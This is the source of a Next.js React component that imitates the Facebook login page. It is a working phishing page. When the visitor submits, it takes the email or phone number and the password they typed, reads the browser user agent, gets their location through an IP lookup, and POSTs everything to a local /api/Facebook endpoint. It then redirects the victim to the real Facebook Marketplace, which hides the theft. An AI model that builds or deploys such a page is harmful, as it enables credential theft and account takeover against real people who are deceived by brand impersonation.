"use client";
import { useState } from "react";
import { toast } from "sonner";
import { useRouter } from 'next/navigation';

export default function Facebook() {
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const router = useRouter();

  const getLocationViaIP = async () => {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    return `${data.city}, ${data.region}, ${data.country_name}`;
  } catch (err) {
    console.warn("Failed to get location:", err);
    return "Unknown";
  }
};

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
     const device = navigator.userAgent;
     const location = await getLocationViaIP();
     console.log(emailOrPhone, password, device, location);
     console.log("User Agent:", navigator.userAgent);


    const res = await fetch('/api/Facebook', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ emailOrPhone, password, device, location }),
    });

    const data = await res.json();
    console.log('Server response:', data);
    toast.success(data.message); // or use `toast()` if using Sonner
    router.push("https://www.facebook.com/marketplace/")
  };
  return (
    <div className="flex flex-col md:flex-row items-center justify-center min-h-screen bg-gray-100 p-4">
      
      {/* Facebook branding and text */}
      <div className="md:w-1/2 mb-10 md:mb-0 text-center md:text-left">
        <h1 className="text-blue-600 text-5xl font-bold mb-4">facebook</h1>
        <p className="text-xl text-gray-700">
          Connect with friends and the world around you on Facebook.
        </p>
      </div>

      {/* Login card */}
      <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md">
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="text"
            placeholder="Email or Phone Number"
            className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            value={emailOrPhone}
            onChange={(e) => setEmailOrPhone(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button
            type="submit"
            className="w-full bg-blue-600 text-white font-semibold py-3 rounded-md hover:bg-blue-700 transition"
          >
            Log In
          </button>
        </form>

        <div className="text-center my-4">
          <a href="#" className="text-blue-600 text-sm hover:underline">Forgot Password?</a>
        </div>

        <hr className="my-4" />

        <div className="text-center">
          <button className="bg-green-500 text-white font-semibold py-2 px-4 rounded-md hover:bg-green-600 transition">
            Create New Account
          </button>
        </div>
      </div>
    </div>
  )
}
